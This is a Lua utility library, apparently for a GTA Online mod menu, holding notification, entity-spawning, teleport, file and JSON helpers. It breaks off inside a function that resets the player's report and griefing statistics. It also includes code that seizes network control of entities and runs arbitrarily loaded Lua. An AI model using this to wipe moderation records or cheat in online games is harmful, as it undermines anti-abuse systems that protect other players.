json = require "lib.SakuraScript.main.json.json"

----------
--share function
----------

----错误记录
function LOG(message)
    local dir = filesystem.stand_dir() .. "Sakura.log"
    local file = io.open(dir, "a+")
    file:write(os.date("\n[%Y-%m-%d %H:%M:%S]") .. " " .. message)
    file:close()
end
function ERROR_LOG(error_message)
    LOG("[ERROR] " .. error_message)
    util.toast("[ERROR] " .. "\n" .. error_message)
    util.stop_script()
end

----播放音频
--来自https://github.com/calamity-inc/Soup-Lua-Bindings/blob/main/LUA_API.md
--似乎正常无法停止
function PlaySound(dir)--dir-指向绝对文件(local dir = filesystem.scripts_dir() .. '\\daidaiScript\\audio\\payphone.wav')
    local fr = soup.FileReader(dir)
    local wav = soup.audWav(fr)
    local dev = soup.audDevice.getDefault()--选择默认音频驱动
    local devname = dev:getName()--获取播放驱动名
    local pb = dev:open(wav.channels)
    local mix = soup.audMixer()

    mix.stop_playback_when_done = true
    mix:setOutput(pb)
    mix:playSound(wav)

    while pb:isPlaying() do 
        --控制播放时间
            util.yield(10) 
            --return
    end
end

----条件等待
function condition_wait(condition, timer)
    local end_time = os.time() + (timer or 0)
    while condition and end_time > os.time() do
        util.yield()
    end
end

----通知
--请求纹理(未用)
function request_streamed_texture_dict(textureDict, timeout)
    local end_time = os.time() + (timeout or 1)
    GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(textureDict, false)
    while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(textureDict) and end_time > os.time() do
        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(textureDict, false)
        util.yield()
    end
end
function notification(format, colour, title)
    local titled = title or "通知"
	local msg = string.format(format)
	HUD.THEFEED_SET_BACKGROUND_COLOR_FOR_NEXT_POST(colour or HudColour.blue)
    HUD.BEGIN_TEXT_COMMAND_THEFEED_POST("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(msg)
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT("CHAR_SOCIAL_CLUB", "CHAR_SOCIAL_CLUB", true, 4, "Sakura", "~b~"..titled) -- youtube "CHAR_YOUTUBE"  https://pastebin.com/XdpJVbHz
	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(false, false)
end
function notify(format, colour)
    HUD.THEFEED_SET_BACKGROUND_COLOR_FOR_NEXT_POST(colour or HudColour.blue)
    HUD.BEGIN_TEXT_COMMAND_THEFEED_POST("CELL_EMAIL_BCON") --包含按钮，默认为“STRING”
    local length = #format
    local maxStringLength = 40   --1个StringLength = 10字符(1汉字=3字符)    1行23个字符
    for i = 1, length, maxStringLength do
        local substring = format:sub(i, math.min(i + maxStringLength - 1, length))
        HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(substring)
    end
    HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(false, false)
end
--显示帮助文本
function show_help_text(str)
    HUD.BEGIN_TEXT_COMMAND_DISPLAY_HELP("CELL_EMAIL_BCON") --包含按钮，默认为“STRING”
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(str)
    HUD.END_TEXT_COMMAND_DISPLAY_HELP(0, false, false, -1)
end
--显示标题
function show_subtitle(str, duration)
    HUD.BEGIN_TEXT_COMMAND_PRINT("CELL_EMAIL_BCON")
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME("dwadw")
    HUD.END_TEXT_COMMAND_PRINT(duration, 1)
end
----绘制文字
function draw_string(str, x, y, scale, font)--font=4无法显示中文,系统英语可显示斜体云字体
	HUD.SET_TEXT_FONT(font or 1)
	HUD.SET_TEXT_SCALE(scale, scale)
	HUD.SET_TEXT_DROP_SHADOW()
	HUD.SET_TEXT_WRAP(0.0, 1.0)
	HUD.SET_TEXT_DROPSHADOW(1, 0, 0, 0, 0)
	HUD.SET_TEXT_OUTLINE()
	HUD.SET_TEXT_EDGE(1, 0, 0, 0, 0)
    HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(str)
	HUD.END_TEXT_COMMAND_DISPLAY_TEXT(x, y, 0)
    --HUD.SET_TEXT_COLOUR(255, 0, 255, 255)
end
----获取标签文本
function get_label_text(labelName)
    return HUD.GET_FILENAME_FOR_AUDIO_CONVERSATION(labelName)
end


----计时器
function newTimer()
	local self = {start = util.current_time_millis()}
	local function reset()
		self.start = util.current_time_millis() --获取ms级时间
	end
	local function elapsed()
		return util.current_time_millis() - self.start
	end
	return
	{
		reset = reset,
		elapsed = elapsed
	}
end;timer = newTimer()
----声音create
function Sound_new(name, reference)----原函数名Sound.new
    local inst = setmetatable({}, Sound)
    inst.name = name
    inst.reference = reference
    return inst
end
function new_colour(R, G, B, A)
    return {r = R / 255, g = G / 255, b = B / 255, a = A}
end

----创建效果
Effect = {asset = "", name = "", scale = 1.0}
Effect.__index = Effect
function Effect.new(asset, name, scale)
	local inst = setmetatable({}, Effect)
	inst.name = name
	inst.asset = asset
	inst.scale = scale
	return inst
end





--请求模型
function request_model(hash, timeout)
    local end_time = os.time() + (timeout or 1)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) and end_time > os.time() do
        STREAMING.REQUEST_MODEL(hash)
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(hash)
end
function request_models(...)--模型表
	local arg = {...}
	for _, model in ipairs(arg) do
        local end_time = os.time() + 3
        STREAMING.REQUEST_MODEL(model)
		while not STREAMING.HAS_MODEL_LOADED(model) and end_time > os.time() do
            STREAMING.REQUEST_MODEL(model)
			util.yield()
		end
	end
end
----请求效果
function request_ptfx_asset(asset, timeout)
    local end_time = os.time() + (timeout or 1)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) and end_time > os.time() do
		STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
		util.yield()
	end
    GRAPHICS.USE_PARTICLE_FX_ASSET(asset)
end
--移除效果
function remove_particle_fx(ptfxs)
    if type(ptfxs) == "table" then
        for k, ptfx in pairs(ptfxs) do
            if GRAPHICS.DOES_PARTICLE_FX_LOOPED_EXIST(ptfx) then --loop粒子
                GRAPHICS.REMOVE_PARTICLE_FX(ptfx)
            end
        end
    end
    if GRAPHICS.DOES_PARTICLE_FX_LOOPED_EXIST(ptfxs) then
        GRAPHICS.REMOVE_PARTICLE_FX(ptfxs)
    end
end
----请求脚本
function request_script(scriptname, timeout)
    local end_time = os.time() + (timeout or 1)
    SCRIPT.REQUEST_SCRIPT(scriptname)
    while not SCRIPT.HAS_SCRIPT_LOADED(scriptname) and end_time > os.time() do
		SCRIPT.REQUEST_SCRIPT(scriptname)
		util.yield()
	end
end

--请求控制
function request_control(entity, timeout)
    local end_time = os.time() + (timeout or 1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and end_time > os.time() do
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        util.yield()
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end
--请求动作执行
function request_anim_dict(animDict, timeout)--表演动作
    local end_time = os.time() + (timeout or 1)
    STREAMING.REQUEST_ANIM_DICT(animDict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(animDict) and end_time > os.time() do
        STREAMING.REQUEST_ANIM_DICT(animDict)
        util.yield()
    end
end
--执行动作
function play_animation(ped, animDict, animName, blendInSpeed, blendOutSpeed, duration, flag, playbackRate)
    request_anim_dict(animDict)
    TASK.TASK_PLAY_ANIM(ped, animDict, animName, blendInSpeed, blendOutSpeed, duration, flag, playbackRate or 0.0, false, false, false)
end
--请求动作设置
function request_anim_set(dict, timeout)--移动方式
    local end_time = os.time() + (timeout or 1)
    STREAMING.REQUEST_ANIM_SET(dict)
    while not STREAMING.HAS_ANIM_SET_LOADED(dict) and end_time > os.time() do
        STREAMING.REQUEST_ANIM_SET(dict)
        util.yield()
    end
end
--请求武器效果
function request_weapon_asset(hash, timeout)
    local end_time = os.time() + (timeout or 1)
    WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
	while not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) and end_time > os.time() do
        WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
        util.yield() 
    end
end
----请求IPL
function request_ipl(name, timeout)
    local end_time = os.time() + (timeout or 1)
    STREAMING.REQUEST_IPL(name)
    while not STREAMING.IS_IPL_ACTIVE(name) and end_time > os.time() do
        STREAMING.REQUEST_IPL(name)
        util.yield() 
    end
end
----移除IPL
function remove_ipl(name)
    if STREAMING.IS_IPL_ACTIVE(name) then
        STREAMING.REMOVE_IPL(name)
    end
end

----创建PED
function create_ped(pedtype, hash, x, y, z, head)
    request_model(hash)
    local ped =  PED.CREATE_PED(pedtype, hash, 0, 0, 0, head, true, false)
    ENTITY.SET_ENTITY_COORDS(ped, x, y, z, false, false, false, false)
    return ped
end
----创建载具
function create_vehicle(hash, x, y, z, head)
    request_model(hash)
    local veh =  VEHICLE.CREATE_VEHICLE(hash, 0, 0, 0, head, true, true, false)
    ENTITY.SET_ENTITY_COORDS(veh, x, y, z, false, false, false, false)
    VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0) --设置后才能更改载具套件
    return veh
end
----创建物体
function create_object(hash, x, y, z)
    request_model(hash)
    local obj =  OBJECT.CREATE_OBJECT(hash, 0, 0, 0, true, false, true)
    ENTITY.SET_ENTITY_COORDS(obj, x, y, z, false, false, false, false)
    return obj
end
----创建拾取物
function create_ambient_pickup(x, y, z, hash, modelhash)
    request_model(modelhash)
    OBJECT.CREATE_AMBIENT_PICKUP(hash, x, y, z, 0, 1, modelhash, false, true)
end
----删除实体
function delete_entity(...)
    local ents = {...}
	for _, ent in ipairs(ents) do
        if ENTITY.DOES_ENTITY_EXIST(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, true, true)--设置为任务实体即可正常删除
            entities.delete(ent)
        end
	end
end

----文件写入
function filewrite(filepath, method, content)
    local file = io.open(filepath, method)--"w+"文件不存在即创建
    file:write(content)
    file:close()
end
----读取文件
function fileread(filepath, method, rtype)
    if filesystem.exists(filepath) then
        local file = io.open(filepath, method)
        local data = file:read(rtype)--'*all'从当前位置读取整个文件
        file:close()
        return data
    end
end
----读取文件信息
function read_fileinfo(path)--指导说明https://blog.csdn.net/langeldep/article/details/8455783
    local info = {}
        info.fullname = string.match(path, ".+\\([^\\]*%.%w+)$")--全名
        info.ext = path:match(".+%.(%w+)$")--扩展名
        info.name = path:sub(path:rfind("\\")+1, path:match(".+()%.%w+$") - 1)--仅文件名
        --local filedir, fullname, ext = string.match(path, "(.-)([^\\/]-%.?([^%.\\/]*))$")--filedir = 路径, name = 文件名(包含扩展名), ext = 仅扩展名
    return info
end
----读取txt文件
function read_txtfile(dir)
    local text = {}
    if filesystem.exists(dir) then
        local open = io.open(dir, "r")
        for line in open:lines() do
            if not string.contains(line, "#") and line ~= "" then --"#"默认为txt文本注释符号
                table.insert(text, line)
            end
        end
        open:close()
    else
        ERROR_LOG("unable to find target file")
    end
    return text
end
----加载Lua代码
function load_code(code)
    -- 加载并执行读取的代码
    local chunk, err = load(code)
    if chunk then
        chunk() -- 执行加载的代码
    end
end


----更改模型
function change_model(player, hash)
	request_model(hash)
    if STREAMING.HAS_MODEL_LOADED(hash) then
        PLAYER.SET_PLAYER_MODEL(player, hash)
        PED.SET_PED_DEFAULT_COMPONENT_VARIATION(PLAYER.PLAYER_PED_ID())
        PED.CLEAR_ALL_PED_PROPS(PLAYER.PLAYER_PED_ID())
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        --[[ give_all_weapon(player) ]]
    end
end

----个人传送
function teleport(x, y, z, keep_veh)
    if x == 0 and y == 0 and z == 0 then
        util.toast("找不到坐标")
    else
        if keep_veh then
            PED.SET_PED_COORDS_KEEP_VEHICLE(PLAYER.PLAYER_PED_ID(), x, y, z)
        else
            ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), x, y, z, false, false, false, false)
        end
    end
end

----驾驶载具
function drive_vehicle(vehicle)
    if ENTITY.IS_ENTITY_A_VEHICLE(vehicle) then
        local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1)
        if ENTITY.DOES_ENTITY_EXIST(driver) and not PED.IS_PED_A_PLAYER(driver) then
            delete_entity(driver)
        end
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), vehicle, -1)
    end
end


----其他置顶

--设置实体完全可见
function set_entity_full_visible(entity, toggled)
    if toggled then
        ENTITY.SET_ENTITY_ALPHA(entity, 255, false)
    else
        ENTITY.SET_ENTITY_ALPHA(entity, 0, false)
    end
    ENTITY.SET_ENTITY_VISIBLE(entity, toggled, false)
end

--冷静(静止)PED
function calm_ped(ped, toggle)
    if ENTITY.IS_ENTITY_A_PED(ped) == 0 then return end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, toggle)
    PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, not toggle)
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 17, toggle)
end

----获取距离
function Get_distance(pos1, pos2, useZ)
    local distance = MISC.GET_DISTANCE_BETWEEN_COORDS(pos1.x, pos1.y, pos1.z, pos2.x, pos2.y, pos2.z, useZ)
    --local distance = math.sqrt((pos1.x-pos2.x)*(pos1.x-pos2.x) + (pos1.y-pos2.y)*(pos1.y-pos2.y) + (pos1.z-pos2.z)*(pos1.z-pos2.z))--平方根计算距离
    --local distance = vector3.distance(pos1, pos2) --v3计算
    return distance
end
----获取地面坐标
function waypoint_coord(x, y, z)
    local coord = {x = x,y = y,z = z}
    local boolpara, posz = util.get_ground_z(x, y)--MISC.GET_GROUND_Z_FOR_3D_COORD(pos.x, pos.y, pos.z, ground_ptr, false, false)
    local esliposz = 0
    while not boolpara and esliposz <= 100 do
        boolpara, posz = util.get_ground_z(x, y)
        esliposz = esliposz + 1
        util.yield()
    end
    if boolpara then
        coord.z = posz
    end
    return coord
end

--世界坐标转屏幕坐标
function world_to_screen_coords(x, y, z)
    local sc_x = memory.alloc(8)
    local sc_y = memory.alloc(8)
    GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(x, y, z, sc_x, sc_y)
    local ret = {
        x = memory.read_float(sc_x),
        y = memory.read_float(sc_y)
    }
    return ret
end

----设置实体面对实体
function set_entity_face_entity(entity, target, usePitch)
    local pos1 = ENTITY.GET_ENTITY_COORDS(entity, false)
    local pos2 = ENTITY.GET_ENTITY_COORDS(target, false)
    local rel = v3.sub(pos2, pos1)
    local rot = v3.toRot(rel)
    if not usePitch then --上下旋转
        ENTITY.SET_ENTITY_HEADING(entity, rot.z)
    else
        ENTITY.SET_ENTITY_ROTATION(entity, rot.x, rot.y, rot.z, 2, 0)
    end
end

--获取武器hash
function get_weapon_hash(ped)
    local wpn_ptr = memory.alloc_int()
    if WEAPON.GET_CURRENT_PED_VEHICLE_WEAPON(ped, wpn_ptr) then -- 只有当武器是车辆武器时才返回true
        return memory.read_int(wpn_ptr), true
    end
    return WEAPON.GET_SELECTED_PED_WEAPON(ped), false
end

----获取瞄准实体信息
function get_entity_info(ent)
    local info = {}
    local ent_types = {"nil","PED", "载具", "物体"}
    if ENTITY.DOES_ENTITY_EXIST(ent) then
        info["hash"] = ENTITY.GET_ENTITY_MODEL(ent)
        info["health"] = ENTITY.GET_ENTITY_HEALTH(ent)
        info["type"] = ENTITY.GET_ENTITY_TYPE(ent)
        info["type_name"] = ent_types[ENTITY.GET_ENTITY_TYPE(ent)+1]
        info["speed"] = math.floor(ENTITY.GET_ENTITY_SPEED(ent))
        return info
    end
    return 0
end
-----获取瞄准实体句柄
function get_entity_player_is_aiming_at(player)
    local entity = 0
	if not PLAYER.IS_PLAYER_FREE_AIMING(player) then
		return 0
	end
    local aimed_entity = memory.alloc_int()
	if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(player, aimed_entity) then
		entity = memory.read_int(aimed_entity)
	end
	if ENTITY.DOES_ENTITY_EXIST(entity) and ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_IN_ANY_VEHICLE(entity, false) then --如果实体在载具,则返回载具信息
		entity = PED.GET_VEHICLE_PED_IS_IN(entity, false)
	end
	return entity
end

----从相机获取偏移量
function get_offset_from_camera(distance)
    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(0)
    local cam_pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
    local direction = vector3.toDir(cam_rot) -- v3.toDir(cam_rot)
    local destination =
    {
        x = cam_pos.x + direction.x * (distance or 0),
        y = cam_pos.y + direction.y * (distance or 0),
        z = cam_pos.z + direction.z * (distance or 0)
    }
    return destination
end

----附加
function attach_to_player(hash, bone, x, y, z, xrot, yrot, zrot)           
    local user_ped = PLAYER.PLAYER_PED_ID()
    hash = util.joaat(hash)
    request_model(hash)
    local object = OBJECT.CREATE_OBJECT(hash, 0.0,0.0,0, true, true, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, user_ped, PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), bone), x, y, z, xrot, yrot, zrot, false, false, false, false, 0, true, 0) 
end

----判断实体在水上
function is_entity_on_water(ent)
    local ht = memory.alloc(4)
    local pos = ENTITY.GET_ENTITY_COORDS(ent)
    return WATER.GET_WATER_HEIGHT(pos.x, pos.y, pos.z, ht)--(ENTITY.IS_ENTITY_IN_WATER(ent)判断实体是否在水中/水上返回false)
end

----脚本
--判断脚本运行
function IS_SCRIPT_RUNNING(scriptname)
    return SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat(scriptname)) > 0
end
--开始脚本
function START_SCRIPT(name)
    request_script(name)
    SYSTEM.START_NEW_SCRIPT(name, 5000)
end

----BIT
function SET_BIT(bits, place) -- Credit goes to WiriScript
    return (bits | (1 << place))
end
function CLEAR_BIT(bits, place)
	return (bits & ~(1 << place))
end
function TEST_BIT(bits, place)
	return (bits & (1 << place)) ~= 0
end



----随机字符串
function random_string(length)
    local name = ""
    local strings = "abcdefghijklmnopqrstuvwxyzABCEDFGHIJKLMNOPQRSTUVWXYZ0123456789"
    for i = 1, length do 
        name = name .. strings[math.random(#strings)]  
    end
    return name
end
----从表取随机元素
function tbl_to_random(tbl)
    local r = math.random(#tbl)
    return tbl[r]
end


----表查询
function table_find(tbl, val)
    if type(tbl) == "table" then
        -- 遍历表中的每一个键值对
        for _, value in pairs(tbl) do
            -- 如果找到匹配的值，返回 true
            if value == val then
                return true
            end
            -- 如果值是一个表，递归检查
            if type(value) == "table" then
                local exists = table_find(value, val)
                -- 如果递归调用返回 true，说明找到了，直接返回
                if exists then
                    return true
                end
            end
        end
    end
    -- 遍历结束，未找到匹配的值，返回 false
    return false
end

----json字符串转变为 table表
function JsonToTable(strings)
    return json.decode(strings)
end
----table表转json字符串
function TableToJson(tbl)
    return json.stringify(tbl, nil, 4) --默认空格字符4
end
----table表转字符串
function TableToString(tbl)
    local result = "{"
    local separator = ""
    for k, v in pairs(tbl) do
        result = result .. separator
        if type(k) == "number" then
            result = result .. "[" .. k .. "]"
        else
            result = result .. k
        end
        result = result .. "="
        if type(v) == "table" then
            result = result .. TableToString(v)
        elseif type(v) == "string" then
            result = result .. string.format("%q", v)
        else
            result = result .. tostring(v)
        end
        separator = ","
    end
    result = result .. "}"
    return result
end

----从json获取信息
function get_info_from_jsonfile(filepath)
    local file = io.open(filepath, "r")
    if file then
        local data = json.decode(file:read("*a"))
        file:close()
        return data
    else
        ERROR_LOG("无法读取文件" .. filepath .. "'")
    end
end

--禁止按键活动
function disable_control_action(...)
    local keys = {...}
    for k, v in pairs(keys) do
        PAD.DISABLE_CONTROL_ACTION(0, v, true)
    end
end
--显示按键
function display_buttons(tbl)
    --Head
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    --Body
    for k, v in pairs(tbl) do
        sf.SET_DATA_SLOT(v[1], PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, v[2], true), v[3])
    end
    --end
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

----玩家加入离开
local JL_state = {}
function player_join(func)
    if NETWORK.NETWORK_IS_SESSION_ACTIVE() then
        --实时战局玩家
        local all_player = {}
        for pid = 0, 32 do
            if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
                all_player[pid] = PLAYER.GET_PLAYER_NAME(pid)
            end
        end
        --玩家加入
        for pid, name in pairs(all_player) do
            if not table_find(JL_state, name) then
                JL_state[pid] = name
                if type(func) == "function" then
                    func(pid, name)  --返回pid, name
                end
            end
        end
    else
        JL_state = {}
    end
end
function player_leave(func)
    if NETWORK.NETWORK_IS_SESSION_ACTIVE() then
        --实时战局玩家
        local all_player = {}
        for pid = 0, 32 do
            if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
                all_player[pid] = PLAYER.GET_PLAYER_NAME(pid)
            end
        end
        --玩家加入
        for pid, name in pairs(all_player) do
            if not table_find(JL_state, name) then
                JL_state[pid] = name
            end
        end
        --玩家离开
        for pid, name in pairs(JL_state) do
            if not table_find(all_player, name) then
                JL_state[pid] = nil
                if type(func) == "function" then
                    func(pid, name)  --返回pid, name
                end
            end
        end
    else
        JL_state = {}
    end
end

------------------------------------------------------------------------------------------------------


























----十六进制颜色值转换为RGB格式
function hexToRGB(hex, alpha)
    -- 移除可能存在的#号
    hex = hex:gsub("#","")
    local color = {a = alpha or 1}
    -- 获取颜色的R、G、B分量
    color.r = tonumber(hex:sub(1,2), 16) / 255
    color.g = tonumber(hex:sub(3,4), 16) / 255
    color.b = tonumber(hex:sub(5,6), 16) / 255
    -- 返回RGB值
    return color
end
--将RGB颜色值转换为十六进制格式
function RGBToHex(r, g, b)
    -- 将RGB值转换为十六进制格式
    local hex = string.format("#%02X%02X%02X", math.floor(r * 255), math.floor(g * 255), math.floor(b * 255))
    -- 返回十六进制颜色值
    return hex
end



----移除所有摄像头
function remove_all_camera()
    for _, ent in pairs(entities.get_all_objects_as_handles()) do
        for __, cam in pairs(CamList) do
            if ENTITY.GET_ENTITY_MODEL(ent) == cam then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent,true,true) --先设置为任务实体 不执行这个下面会删除失败
                delete_entity(ent)             
            end
        end
    end
end

-----透视无人机
function show_nano_drone()
    local objs = entities.get_all_objects_as_pointers()
    for _, obj in pairs(objs) do
        if (entities.get_model_hash(obj) == 430841677) or (entities.get_model_hash(obj) == -1324942671) then --nano drone object
            local pos = entities.get_position(obj)
            local ourpedpos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
            GRAPHICS.DRAW_LINE(ourpedpos.x, ourpedpos.y, ourpedpos.z, pos.x, pos.y, pos.z, 255, 255, 255, 255)
        end
    end
end

----强制所有潜艇浮出水面
function Force_surface_all_subs(toggled)
    local vehHandles = entities.get_all_vehicles_as_handles()
    for i = 1, #vehHandles do
        if ENTITY.GET_ENTITY_MODEL(vehHandles[i]) == 1336872304 then -- if Kosatka
            VEHICLE.FORCE_SUBMARINE_SURFACE_MODE(vehHandles[i], toggle)
        end
    end
end


----加载IPL地图
function load_IPL(IPL_list, x, y, z, val)
    if val == 1 then
        for i = 1, #IPL_list do
            request_ipl(IPL_list[i])
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), x, y, z, false, false, false)
    else
        for i = 1, #IPL_list do
            remove_ipl(IPL_list[i])
        end
    end
end

--获取最近的载具
function get_closest_vehicle(entity , closestdist)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    local vehicles = entities.get_all_vehicles_as_handles()
    closestdist = closestdist or 1000000
    local closestveh = 0
    for k, veh in pairs(vehicles) do
        --判断实体是否为PED
        if ENTITY.GET_ENTITY_TYPE(entity) == 1 then

            --判断该ped是否在载具
            if PED.IS_PED_IN_ANY_VEHICLE(entity, false) then
                if veh ~= PED.GET_VEHICLE_PED_IS_IN(entity, false) then
                    local vehcoord = ENTITY.GET_ENTITY_COORDS(veh, true)
                    local dist = Get_distance(coords, vehcoord, true)
                    if dist < closestdist then
                        closestdist = dist
                        closestveh = veh
                    end
                end
            else
                local vehcoord = ENTITY.GET_ENTITY_COORDS(veh, true)
                local dist = Get_distance(coords, vehcoord, true)
                if dist < closestdist then
                    closestdist = dist
                    closestveh = veh
                end
            end

        else
            --实体为非ped时
            local vehcoord = ENTITY.GET_ENTITY_COORDS(veh, true)
            local dist = Get_distance(coords, vehcoord, true)
            if dist < closestdist then
                closestdist = dist
                closestveh = veh
            end
        end

    end
    return closestveh
end

--获取最近的PED
function get_closest_ped(ent, dist)
    local closest_ped = nil
    local closest_dist = dist or 1000000
    local this_dist = 0
    local coords = ENTITY.GET_ENTITY_COORDS(ent, false)
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
        if this_dist < closest_dist and ped ~= PLAYER.PLAYER_PED_ID() then
            closest_ped = ped
            closest_dist = this_dist
        end
    end
    return closest_ped
end
--获取最近的玩家
function get_closest_player(ent, dist)
    local closest_ped = nil
    local closest_dist = dist or 1000000
    local this_dist = 0
    local coords = ENTITY.GET_ENTITY_COORDS(ent, false)
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
        if this_dist < closest_dist and ped ~= PLAYER.PLAYER_PED_ID() and PED.IS_PED_A_PLAYER(ped) then
            closest_ped = ped
            closest_dist = this_dist
        end
    end
    return closest_ped
end














----粒子枪
local had_sle_particle_gun = {lib = 'scr_rcbarry2', name = 'scr_clown_appears'}--默认
function selete_particle_gun(index)
    had_sle_particle_gun = particle_gund.value[index]
end
function particle_gun()
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        local hash = util.joaat("w_lr_firework_rocket")
        local player_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 0.5, 0.5)
        local dir = {}
        local c2 = {}
        c2 = get_offset_from_camera(15)
        dir.x = (c2.x - player_pos.x) * 15
        dir.y = (c2.y - player_pos.y) * 15
        dir.z = (c2.z - player_pos.z) * 15

        if ENTITY.DOES_ENTITY_EXIST(particle_gun_bullet) then
            delete_entity(particle_gun_bullet)
        end
        particle_gun_bullet = create_object(hash, player_pos.x, player_pos.y, player_pos.z)
        set_entity_full_visible(particle_gun_bullet,false)

        ENTITY.SET_ENTITY_INVINCIBLE(particle_gun_bullet,true)
        ENTITY.SET_ENTITY_COLLISION(particle_gun_bullet, false, true)
        ENTITY.SET_ENTITY_HAS_GRAVITY(particle_gun_bullet, false)

        local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(particle_gun_bullet, 1, dir.x, dir.y, dir.z, false, false, false, false)
        ENTITY.SET_ENTITY_ROTATION(particle_gun_bullet, cam_rot.x, cam_rot.y, cam_rot.z, 0, true)

        request_ptfx_asset(had_sle_particle_gun.lib)
        GRAPHICS.USE_PARTICLE_FX_ASSET(had_sle_particle_gun.lib)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(had_sle_particle_gun.name, particle_gun_bullet, 0, 0, 0, 0, 180, 0, 1, true, true, true)
    end
end

----从银行取出钱
function bank_to_wallet()
    local bankCash = MONEY.NETWORK_GET_VC_BANK_BALANCE()
    if bankCash > 0 then
        NETSHOPPING1._NET_GAMESERVER_TRANSFER_BANK_TO_WALLET(0, bankCash)
        util.toast("取出 "..bankCash.."$ 到钱包")
    else
        util.toast("余额不足,交易失败")
    end
end
----将钱存入银行
function wallet_to_bank()
    local walletCash = MONEY.NETWORK_GET_VC_WALLET_BALANCE(0)
    if walletCash > 0 then
        NETSHOPPING1._NET_GAMESERVER_TRANSFER_WALLET_TO_BANK(0, walletCash)
        util.toast("存入 "..walletCash.."$ 到银行")
    else
        util.toast("余额不足,交易失败")
    end
end
----自动存款
function auto_deposit()
    local walletCash = MONEY.NETWORK_GET_VC_WALLET_BALANCE(0)
    if walletCash > 0 then
        NETSHOPPING1._NET_GAMESERVER_TRANSFER_WALLET_TO_BANK(0, walletCash)
        util.toast("已将"..walletCash.."$存入银行")
    end
end

----清除举报
function remove_reports()
    STAT_SET_INT("MPPLY_FRIENDLY", 0) --乐于助人
    STAT_SET_INT("MPPLY_HELPFUL", 0) --友方
    STAT_SET_INT("MPPLY_GRIEFING", 0) --恶意或破坏性行为
    STAT_SET_INT("MPPLY_VC_ANNOYINGME", 0) --语音聊天: 骚扰我
    STAT_SET_INT("MPPLY_VC_HATE", 0) --语音聊天: 使用仇恨言论
